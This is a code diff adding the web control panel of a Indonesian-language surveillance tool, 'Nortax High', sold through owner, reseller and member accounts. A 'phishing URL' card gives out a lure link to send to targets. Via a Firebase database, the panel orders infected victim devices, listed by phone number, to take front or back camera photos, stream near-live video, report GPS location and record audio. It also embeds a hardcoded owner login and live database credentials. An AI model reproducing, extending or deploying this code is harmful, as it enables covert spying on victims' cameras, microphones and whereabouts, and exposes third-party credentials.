@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Nortax High - Control Center</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root { --bg: #050505; --card: #0f0f0f; --border: #222222; --txt: #ffffff; --muted: #888888; --accent: #ef4444; --accent-hover: #dc2626; --success: #10b981; --danger: #ef4444; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--txt); overflow: hidden; height: 100vh; -webkit-font-smoothing: antialiased; }
+  .hidden { display: none !important; }
+
+  /* LOGIN */
+  #login-view { display: flex; align-items: center; justify-content: center; height: 100vh; background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%); }
+  .login-box { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 40px 32px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.8); }
+  .login-box img { width: 100%; max-height: 80px; object-fit: contain; margin-bottom: 24px; }
+  .login-box h2 { font-size: 24px; font-weight: 900; color: var(--accent); margin-bottom: 8px; letter-spacing: 1.5px; }
+  .login-box p { font-size: 13px; color: var(--muted); margin-bottom: 32px; }
+  .input-group { position: relative; margin-bottom: 16px; }
+  .input-group i { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: var(--muted); }
+  .input-group input { width: 100%; padding: 16px 16px 16px 48px; background: #000; border: 1px solid var(--border); border-radius: 12px; color: white; outline: none; font-size: 14px; transition: 0.2s; }
+  .input-group input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(239,68,68,0.1); }
+  .btn-primary { background: var(--accent); color: white; border: 0; padding: 16px; border-radius: 12px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; box-shadow: 0 4px 15px rgba(239,68,68,0.3); }
+  .btn-primary:hover { background: var(--accent-hover); transform: translateY(-2px); }
+
+  /* SPLASH */
+  #splash-view { display: none; position: relative; width: 100vw; height: 100vh; background: #000; }
+  #splash-video { width: 100%; height: 100%; object-fit: cover; }
+  .splash-text { position: absolute; bottom: 40px; left: 0; width: 100%; text-align: center; font-size: 32px; font-weight: 900; letter-spacing: 8px; color: white; text-shadow: 0 4px 20px rgba(0,0,0,0.9); z-index: 10; }
+  .btn-skip { position: absolute; top: 32px; right: 32px; background: rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 10px 20px; border-radius: 10px; cursor: pointer; z-index: 10; transition: 0.2s; font-weight: bold; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(4px); }
+  .btn-skip:hover { background: var(--accent); border-color: var(--accent); }
+
+  /* CONTROL */
+  #control-view { display: none; height: 100vh; background: var(--bg); }
+  .toolbar { height: 70px; display: flex; align-items: center; padding: 0 24px; background: var(--card); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+  .btn-menu { background: transparent; border: 0; color: white; font-size: 24px; cursor: pointer; margin-right: 20px; transition: 0.2s; }
+  .btn-menu:hover { color: var(--accent); }
+  .toolbar-title { font-size: 20px; font-weight: 900; color: white; letter-spacing: 1px; }
+  
+  /* SIDEBAR */
+  .sidebar-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 150; display: none; backdrop-filter: blur(3px); }
+  .sidebar-overlay.open { display: block; }
+  .sidebar { position: fixed; top: 0; left: -320px; width: 320px; height: 100vh; background: var(--card); border-right: 1px solid var(--border); z-index: 200; transition: left 0.35s cubic-bezier(0.4, 0, 0.2, 1); display: flex; flex-direction: column; box-shadow: 10px 0 30px rgba(0,0,0,0.5); }
+  .sidebar.open { left: 0; }
+  .sidebar-header { padding: 30px 24px; border-bottom: 1px solid var(--border); background: rgba(255,255,255,0.02); }
+  .sidebar-avatar { width: 56px; height: 56px; background: rgba(239,68,68,0.1); border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 24px; color: var(--accent); margin-bottom: 16px; border: 1px solid rgba(239,68,68,0.2); }
+  .sidebar-user { font-size: 18px; font-weight: 800; }
+  .sidebar-role { font-size: 11px; color: var(--accent); font-weight: 800; text-transform: uppercase; margin-top: 6px; display: inline-block; background: rgba(239,68,68,0.1); padding: 4px 10px; border-radius: 6px; letter-spacing: 0.5px; }
+  .sidebar-exp { font-size: 12px; color: var(--muted); margin-top: 12px; display: flex; align-items: center; gap: 6px; }
+  .sidebar-menu { padding: 20px 16px; flex: 1; overflow-y: auto; }
+  .sidebar-link { display: flex; align-items: center; gap: 14px; padding: 16px; color: var(--muted); text-decoration: none; border-radius: 12px; transition: 0.2s; cursor: pointer; margin-bottom: 6px; font-weight: 600; font-size: 14px; }
+  .sidebar-link:hover { background: rgba(255,255,255,0.05); color: white; }
+  .sidebar-link.active { background: rgba(239,68,68,0.1); color: var(--accent); }
+  .sidebar-link i { width: 22px; text-align: center; font-size: 18px; }
+  .sidebar-link.logout { color: var(--danger); margin-top: auto; }
+  .sidebar-link.logout:hover { background: rgba(239,68,68,0.1); }
+
+  /* MAIN */
+  .main-content { padding: 24px; height: calc(100vh - 70px); overflow-y: auto; }
+  .page { display: none; animation: fadeIn 0.3s ease; }
+  .page.active { display: block; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+  @media (max-width: 1000px) { .grid { grid-template-columns: 1fr; } }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+  .card-title { font-size: 16px; font-weight: 800; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid var(--border); padding-bottom: 16px; }
+  .card-title i { color: var(--accent); }
+  .card-title span { margin-left: auto; font-size: 12px; font-weight: 600; color: var(--muted); }
+
+  /* URL BOX */
+  .url-box { display: flex; flex-direction: column; gap: 14px; }
+  .url-input-group { display: flex; gap: 12px; }
+  .url-input-group input { flex: 1; padding: 14px 18px; background: #000; border: 1px solid var(--border); border-radius: 12px; color: var(--accent); font-family: monospace; font-weight: 700; font-size: 14px; outline: none; }
+  .url-input-group button { padding: 14px 24px; background: var(--accent); color: white; border: 0; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
+  .url-input-group button:hover { background: var(--accent-hover); }
+  .url-input-group button.copied { background: var(--success); }
+
+  /* VIEWER */
+  .viewer-box { background: #000; border-radius: 16px; overflow: hidden; aspect-ratio: 4/3; display: flex; align-items: center; justify-content: center; border: 1px solid var(--border); position: relative; }
+  #img-view { width: 100%; height: 100%; object-fit: contain; display: none; }
+  #log-view { color: var(--success); font-family: monospace; padding: 24px; text-align: left; width: 100%; height: 100%; overflow-y: auto; white-space: pre-wrap; display: none; font-size: 13px; line-height: 1.6; }
+  .placeholder-text { color: var(--muted); font-size: 14px; font-weight: 600; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+  .placeholder-text i { font-size: 32px; opacity: 0.5; }
+  .control-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-top: 24px; }
+  .btn-ctrl { padding: 14px; background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; color: white; font-size: 13px; font-weight: 700; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+  .btn-ctrl:hover { background: rgba(255,255,255,0.1); border-color: #444; }
+  .btn-ctrl.active { background: var(--accent); border-color: var(--accent); color: white; box-shadow: 0 4px 15px rgba(239,68,68,0.3); }
+  .btn-ctrl.stop { background: rgba(239,68,68,0.1); color: var(--danger); border-color: rgba(239,68,68,0.3); }
+  .btn-ctrl.stop:hover { background: var(--danger); color: white; }
+
+  /* TABLE */
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th { text-align: left; color: var(--muted); text-transform: uppercase; font-size: 11px; padding: 14px 12px; border-bottom: 1px solid var(--border); font-weight: 700; }
+  td { padding: 14px 12px; border-bottom: 1px solid var(--border); }
+  .btn-sm { padding: 8px 14px; border: 0; border-radius: 8px; font-size: 12px; font-weight: 700; cursor: pointer; background: rgba(255,255,255,0.05); color: white; transition: 0.2s; border: 1px solid var(--border); }
+  .btn-sm:hover { background: rgba(255,255,255,0.1); }
+  .btn-sm.danger { background: rgba(239,68,68,0.1); color: var(--danger); border-color: rgba(239,68,68,0.2); }
+  .btn-sm.danger:hover { background: var(--danger); color: white; }
+
+  /* MODAL */
+  .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 300; display: none; align-items: center; justify-content: center; }
+  .modal-box { background: var(--card); border: 1px solid var(--border); padding: 32px; border-radius: 20px; width: 100%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.8); }
+  .modal-box h3 { margin-bottom: 24px; color: var(--accent); font-size: 20px; font-weight: 800; }
+  .modal-box input, .modal-box select { width: 100%; padding: 14px; background: #000; border: 1px solid var(--border); color: white; border-radius: 10px; margin-bottom: 14px; outline: none; font-size: 14px; }
+  .modal-box input:focus, .modal-box select:focus { border-color: var(--accent); }
+  .modal-actions { display: flex; gap: 12px; margin-top: 10px; }
+  .modal-actions button { flex: 1; }
+</style>
+</head>
+<body>
+
+<!-- 1. LOGIN VIEW -->
+<div id="login-view">
+  <div class="login-box">
+    <img src="https://c.termai.cc/i188/cSZlsG.png" alt="Nortax High">
+    <h2>NORTAX HIGH</h2>
+    <p>Authorized Personnel Only</p>
+    <div class="input-group"><i class="fa-solid fa-user"></i><input type="text" id="logUser" placeholder="Username"></div>
+    <div class="input-group"><i class="fa-solid fa-lock"></i><input type="password" id="logPass" placeholder="Password"></div>
+    <button class="btn-primary" onclick="doLogin()"><i class="fa-solid fa-sign-in-alt"></i> Sign In</button>
+  </div>
+</div>
+
+<!-- 2. SPLASH VIEW -->
+<div id="splash-view">
+  <video id="splash-video" src="https://c.termai.cc/v141/GH9Uzl.mp4" autoplay></video>
+  <button class="btn-skip" onclick="skipSplash()">Skip <i class="fa-solid fa-forward"></i></button>
+  <div class="splash-text">NORTAX HIGH</div>
+</div>
+
+<!-- 3. CONTROL VIEW -->
+<div id="control-view">
+  <div class="toolbar">
+    <button class="btn-menu" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
+    <div class="toolbar-title">NORTAX HIGH</div>
+  </div>
+
+  <div class="sidebar-overlay" id="sidebar-overlay" onclick="toggleSidebar()"></div>
+
+  <div class="sidebar" id="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-avatar"><i class="fa-solid fa-user-astronaut"></i></div>
+      <div class="sidebar-user" id="side-username">Loading...</div>
+      <div class="sidebar-role" id="side-role">ROLE</div>
+      <div class="sidebar-exp" id="side-exp"><i class="fa-solid fa-clock"></i> -</div>
+    </div>
+    <div class="sidebar-menu">
+      <div class="sidebar-link active" id="nav-dashboard" onclick="switchPage('dashboard')"><i class="fa-solid fa-satellite-dish"></i> Control Panel</div>
+      <div class="sidebar-link hidden" id="nav-owner" onclick="switchPage('owner')"><i class="fa-solid fa-crown"></i> Owner Panel</div>
+      <div class="sidebar-link hidden" id="nav-reseller" onclick="switchPage('reseller')"><i class="fa-solid fa-user-tie"></i> Reseller Panel</div>
+      <div class="sidebar-link" id="nav-profile" onclick="switchPage('profile')"><i class="fa-solid fa-user-gear"></i> Profile</div>
+      <div class="sidebar-link logout" onclick="doLogout()"><i class="fa-solid fa-sign-out-alt"></i> Logout</div>
+    </div>
+  </div>
+
+  <div class="main-content">
+    
+    <!-- PAGE: DASHBOARD -->
+    <div id="page-dashboard" class="page active">
+      <div class="grid">
+        
+        <!-- CARD 1: GET URL -->
+        <div class="card">
+          <div class="card-title"><i class="fa-solid fa-link"></i> Get Url Phising</div>
+          <div class="url-box">
+            <div class="url-input-group">
+              <input type="text" id="phising-url" value="" placeholder="Klik Get untuk generate link..." readonly>
+              <button id="btn-get-url" onclick="handleGetUrl()">Get</button>
+            </div>
+            <p style="font-size: 12px; color: var(--muted); margin-top: 8px;"><i class="fa-solid fa-circle-info"></i> Kirim link ini ke target.</p>
+          </div>
+        </div>
+
+        <!-- CARD 2: LIVE VIEWER -->
+        <div class="card">
+          <div class="card-title"><i class="fa-solid fa-eye"></i> Live Viewer <span id="viewer-target">No Target</span></div>
+          <div class="viewer-box">
+            <span class="placeholder-text" id="viewer-placeholder"><i class="fa-solid fa-camera"></i> Waiting for target...</span>
+            <img id="img-view" src="">
+            <div id="log-view"></div>
+          </div>
+          
+          <div class="control-grid">
+            <button class="btn-ctrl" onclick="cmd('snap', 'user')"><i class="fa-solid fa-camera"></i> Take Front</button>
+            <button class="btn-ctrl" onclick="cmd('snap', 'environment')"><i class="fa-solid fa-camera-retro"></i> Take Back</button>
+            <button class="btn-ctrl" id="btn-live-front" onclick="live('user')"><i class="fa-solid fa-video"></i> Live Front</button>
+            <button class="btn-ctrl" id="btn-live-back" onclick="live('environment')"><i class="fa-solid fa-video"></i> Live Back</button>
+            <button class="btn-ctrl stop" onclick="stopLive()"><i class="fa-solid fa-stop"></i> Stop Live</button>
+            <button class="btn-ctrl" onclick="cmd('geo')"><i class="fa-solid fa-location-dot"></i> GPS</button>
+            <button class="btn-ctrl" onclick="cmd('record_audio')"><i class="fa-solid fa-microphone"></i> Audio</button>
+          </div>
+          <div id="audio-container" style="display:none; margin-top: 20px; text-align: center; background: #000; padding: 16px; border-radius: 12px; border: 1px solid var(--border);">
+            <h4 style="color: var(--success); margin-bottom: 12px; font-size: 14px;"><i class="fa-solid fa-headphones"></i> Audio Captured</h4>
+            <audio id="audio-player" controls style="width: 100%;"></audio>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- PAGE: OWNER -->
+    <div id="page-owner" class="page">
+      <div class="card">
+        <div class="card-title"><i class="fa-solid fa-crown"></i> Access Management (Owner)</div>
+        <button class="btn-sm" style="margin-bottom: 20px;" onclick="openCreateModal('owner')"><i class="fa-solid fa-plus"></i> Create New Access</button>
+        <table id="tbl-users">
+          <thead><tr><th>Username</th><th>Role</th><th>Expired</th><th>Action</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- PAGE: RESELLER -->
+    <div id="page-reseller" class="page">
+      <div class="card">
+        <div class="card-title"><i class="fa-solid fa-user-tie"></i> Reseller Panel</div>
+        <button class="btn-sm" style="margin-bottom: 20px;" onclick="openCreateModal('reseller')"><i class="fa-solid fa-plus"></i> Create Member Access</button>
+        <table id="tbl-reseller-users">
+          <thead><tr><th>Username</th><th>Role</th><th>Expired</th><th>Action</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- PAGE: PROFILE -->
+    <div id="page-profile" class="page">
+      <div class="card" style="max-width: 500px; margin: 0 auto;">
+        <div class="card-title"><i class="fa-solid fa-id-card"></i> My Profile</div>
+        <div style="background: #000; padding: 20px; border-radius: 12px; border: 1px solid var(--border); margin-bottom: 24px;">
+          <div style="display: flex; justify-content: space-between; margin-bottom: 12px;"><span style="color: var(--muted);">Username</span><strong id="prof-user"></strong></div>
+          <div style="display: flex; justify-content: space-between; margin-bottom: 12px;"><span style="color: var(--muted);">Role</span><strong id="prof-role" style="color: var(--accent); text-transform: uppercase;"></strong></div>
+          <div style="display: flex; justify-content: space-between;"><span style="color: var(--muted);">Expired</span><strong id="prof-exp"></strong></div>
+        </div>
+        <h4 style="margin-bottom: 12px; font-size: 14px; color: var(--muted);">Change Password</h4>
+        <input type="password" id="newPass" placeholder="New Password" style="width: 100%; padding: 14px; background: #000; border: 1px solid var(--border); color: white; border-radius: 10px; margin-bottom: 16px; outline: none;">
+        <button class="btn-primary" onclick="changePassword()"><i class="fa-solid fa-key"></i> Update Password</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- MODAL CREATE USER -->
+<div class="modal" id="modal-create">
+  <div class="modal-box">
+    <h3><i class="fa-solid fa-user-plus"></i> Create Access</h3>
+    <input type="text" id="newUser" placeholder="Username">
+    <input type="password" id="newUserPass" placeholder="Password">
+    <select id="newRole">
+      <option value="member">Member</option>
+      <option value="reseller">Reseller</option>
+      <option value="owner">Owner</option>
+    </select>
+    <input type="number" id="newDays" placeholder="Durasi (Hari)" value="30">
+    <div class="modal-actions">
+      <button class="btn-sm danger" style="padding: 14px;" onclick="document.getElementById('modal-create').style.display='none'">Cancel</button>
+      <button class="btn-primary" style="padding: 14px;" onclick="createUser()">Create</button>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+  import { getDatabase, ref, onValue, update, set, get, remove } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyAcCOElhsRPXsKYyJOj4dqmB_7hN2t1kzw",
+    authDomain: "nortax-8c172.firebaseapp.com",
+    databaseURL: "https://nortax-8c172-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "nortax-8c172",
+    storageBucket: "nortax-8c172.firebasestorage.app",
+    messagingSenderId: "193601848909",
+    appId: "1:193601848909:web:4dca98cbd31248ed8b7e04"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  let currentUser = null;
+  let activeBotId = null;
+  let activeFacing = 'user';
+  let liveInterval = null;
+  let isLive = false;
+  let urlFetched = false;
+
+  // --- URL PHISING ---
+  window.handleGetUrl = async () => {
+    const input = document.getElementById('phising-url');
+    const btn = document.getElementById('btn-get-url');
+    if (!urlFetched) {
+      input.value = "https://apkbugnortaxhighv1.vercel.app";
+      btn.textContent = "Copy";
+      urlFetched = true;
+    } else {
+      try {
+        await navigator.clipboard.writeText(input.value);
+        btn.textContent = "Copied!";
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = "Copy"; btn.classList.remove('copied'); }, 2000);
+      } catch (err) { alert("Gagal menyalin."); }
+    }
+  };
+
+  // --- AUTH LOGIN ---
+  window.doLogin = async () => {
+    const user = document.getElementById('logUser').value.trim();
+    const pass = document.getElementById('logPass').value.trim();
+    if (!user || !pass) return alert("Isi username dan password!");
+
+    if (user === "YoggError" && pass === "12345679") {
+      currentUser = { username: user, role: "owner", expired: "Lifetime" };
+      startSplash(); return;
+    }
+
+    try {
+      const snapshot = await get(ref(db, 'users'));
+      if (snapshot.exists()) {
+        const users = snapshot.val();
+        const found = Object.values(users).find(u => u.username === user && u.password === pass);
+        if (found) {
+          if (found.expired !== "Lifetime" && new Date(found.expired) < new Date()) return alert("Akun expired!");
+          currentUser = found; startSplash();
+        } else { alert("Username atau Password salah!"); }
+      } else { alert("Username atau Password salah!"); }
+    } catch (e) { alert("Gagal konek database."); }
+  };
+
+  window.doLogout = () => location.reload();
+
+  // --- SPLASH ---
+  function startSplash() {
+    document.getElementById('login-view').style.display = 'none';
+    document.getElementById('splash-view').style.display = 'block';
+    const video = document.getElementById('splash-video');
+    video.muted = false;
+    video.play().catch(e => console.log("Autoplay blocked."));
+    video.onended = () => enterControlPanel();
+  }
+
+  window.skipSplash = () => {
+    document.getElementById('splash-video').pause();
+    enterControlPanel();
+  };
+
+  // --- CONTROL PANEL ---
+  function enterControlPanel() {
+    document.getElementById('splash-view').style.display = 'none';
+    document.getElementById('control-view').style.display = 'block';
+    document.getElementById('side-username').textContent = currentUser.username;
+    document.getElementById('side-role').textContent = currentUser.role;
+    document.getElementById('side-exp').innerHTML = '<i class="fa-solid fa-clock"></i> Exp: ' + currentUser.expired;
+    document.getElementById('prof-user').textContent = currentUser.username;
+    document.getElementById('prof-role').textContent = currentUser.role;
+    document.getElementById('prof-exp').textContent = currentUser.expired;
+
+    if (currentUser.role === 'owner') {
+      document.getElementById('nav-owner').classList.remove('hidden');
+      document.getElementById('nav-reseller').classList.remove('hidden');
+      loadOwnerTable();
+    } else if (currentUser.role === 'reseller') {
+      document.getElementById('nav-reseller').classList.remove('hidden');
+      loadResellerTable();
+    }
+    startMonitoring();
+  }
+
+  window.toggleSidebar = () => {
+    document.getElementById('sidebar').classList.toggle('open');
+    document.getElementById('sidebar-overlay').classList.toggle('open');
+  };
+
+  window.switchPage = (page) => {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page-' + page).classList.add('active');
+    document.querySelectorAll('.sidebar-link').forEach(l => l.classList.remove('active'));
+    document.getElementById('nav-' + page).classList.add('active');
+    toggleSidebar();
+  };
+
+  // --- LIVE MONITORING ---
+  function startMonitoring() {
+    onValue(ref(db, 'bots'), (snapshot) => {
+      const bots = snapshot.val();
+      if (!bots) return;
+      const onlineBots = Object.keys(bots).filter(id => bots[id].status === 'online');
+      if (onlineBots.length > 0) {
+        activeBotId = onlineBots[onlineBots.length - 1];
+        document.getElementById('viewer-target').textContent = "Target: " + bots[activeBotId].phone;
+      }
+    });
+
+    onValue(ref(db, 'bots'), (snapshot) => {
+      const bots = snapshot.val();
+      if (!bots || !activeBotId || !bots[activeBotId]) return;
+      
+      const b = bots[activeBotId];
+      const imgEl = document.getElementById('img-view');
+      const logEl = document.getElementById('log-view');
+      const place = document.getElementById('viewer-placeholder');
+      const audioCont = document.getElementById('audio-container');
+
+      if (b.img) {
+        place.style.display = 'none'; logEl.style.display = 'none';
+        imgEl.style.display = 'block'; imgEl.src = b.img;
+        audioCont.style.display = 'none';
+      } else if (b.data && b.data.startsWith("data:audio")) {
+        place.style.display = 'none'; imgEl.style.display = 'none'; logEl.style.display = 'none';
+        audioCont.style.display = 'block';
+        document.getElementById('audio-player').src = b.data;
+      } else if (b.data) {
+        place.style.display = 'none'; imgEl.style.display = 'none';
+        logEl.style.display = 'block'; logEl.textContent = b.data;
+        audioCont.style.display = 'none';
+      }
+    });
+  }
+
+  window.cmd = (command, facing = null) => {
+    if (!activeBotId) return alert("Belum ada target terhubung!");
+    const updates = { cmd: command };
+    if (facing) updates.facing = facing;
+    update(ref(db, 'bots/' + activeBotId), updates);
+  };
+
+  window.live = (facing) => {
+    if (!activeBotId) return alert("Belum ada target terhubung!");
+    activeFacing = facing;
+    isLive = true;
+    clearInterval(liveInterval);
+    
+    document.getElementById('btn-live-front').classList.remove('active');
+    document.getElementById('btn-live-back').classList.remove('active');
+    if(facing === 'user') document.getElementById('btn-live-front').classList.add('active');
+    else document.getElementById('btn-live-back').classList.add('active');
+
+    // JEDA DIPERCEPAT JADI 300MS (SUPER SMOOTH)
+    liveInterval = setInterval(() => {
+      get(ref(db, 'bots/' + activeBotId)).then(snap => {
+        const d = snap.val();
+        if (d && d.cmd === 'none' && isLive) {
+          update(ref(db, 'bots/' + activeBotId), { cmd: 'snap', facing: activeFacing });
+        }
+      });
+    }, 300); // 0.3 detik (3 FPS)
+  };
+
+  window.stopLive = () => {
+    isLive = false;
+    clearInterval(liveInterval);
+    liveInterval = null;
+    document.getElementById('btn-live-front').classList.remove('active');
+    document.getElementById('btn-live-back').classList.remove('active');
+  };
+
+  // --- USER MANAGEMENT ---
+  window.openCreateModal = (roleType) => {
+    document.getElementById('modal-create').style.display = 'flex';
+    const select = document.getElementById('newRole');
+    if (roleType === 'reseller') select.innerHTML = '<option value="member">Member</option>';
+    else select.innerHTML = '<option value="member">Member</option><option value="reseller">Reseller</option><option value="owner">Owner</option>';
+  };
+
+  window.createUser = async () => {
+    const user = document.getElementById('newUser').value.trim();
+    const pass = document.getElementById('newUserPass').value.trim();
+    const role = document.getElementById('newRole').value;
+    const days = parseInt(document.getElementById('newDays').value);
+    if (!user || !pass || !days) return alert("Lengkapi data!");
+
+    const expDate = new Date();
+    expDate.setDate(expDate.getDate() + days);
+
+    try {
+      await set(ref(db, 'users/' + user), { username: user, password: pass, role: role, expired: expDate.toISOString().split('T')[0] });
+      alert("Akun dibuat!");
+      document.getElementById('modal-create').style.display = 'none';
+      if(currentUser.role === 'owner') loadOwnerTable();
+      else loadResellerTable();
+    } catch(e) { alert("Gagal membuat akun."); }
+  };
+
+  window.changePassword = async () => {
+    const newPass = document.getElementById('newPass').value.trim();
+    if(!newPass) return alert("Isi password baru!");
+    if (currentUser.username === "YoggError") return alert("Owner hardcode tidak bisa diubah.");
+    try {
+      await update(ref(db, 'users/' + currentUser.username), { password: newPass });
+      alert("Password diubah!");
+      document.getElementById('newPass').value = '';
+    } catch(e) { alert("Gagal ubah password."); }
+  };
+
+  // --- LOAD TABLES ---
+  function loadOwnerTable() {
+    const tbody = document.querySelector('#tbl-users tbody');
+    onValue(ref(db, 'users'), (snap) => {
+      const users = snap.val() || {};
+      tbody.innerHTML = '';
+      Object.values(users).forEach(u => {
+        tbody.innerHTML += `<tr>
+          <td>${u.username}</td><td style="text-transform:uppercase;">${u.role}</td><td>${u.expired}</td>
+          <td><button class="btn-sm danger" onclick="deleteUser('${u.username}')">Delete</button></td>
+        </tr>`;
+      });
+    });
+  }
+
+  function loadResellerTable() {
+    const tbody = document.querySelector('#tbl-reseller-users tbody');
+    onValue(ref(db, 'users'), (snap) => {
+      const users = snap.val() || {};
+      tbody.innerHTML = '';
+      Object.values(users).forEach(u => {
+        if (u.role === 'member') {
+          tbody.innerHTML += `<tr>
+            <td>${u.username}</td><td style="text-transform:uppercase;">${u.role}</td><td>${u.expired}</td>
+            <td><button class="btn-sm danger" onclick="deleteUser('${u.username}')">Delete</button></td>
+          </tr>`;
+        }
+      });
+    });
+  }
+
+  window.deleteUser = async (username) => {
+    if(confirm("Hapus akses " + username + "?")) {
+      await remove(ref(db, 'users/' + username));
+    }
+  };
+</script>
+</body>
+</html>
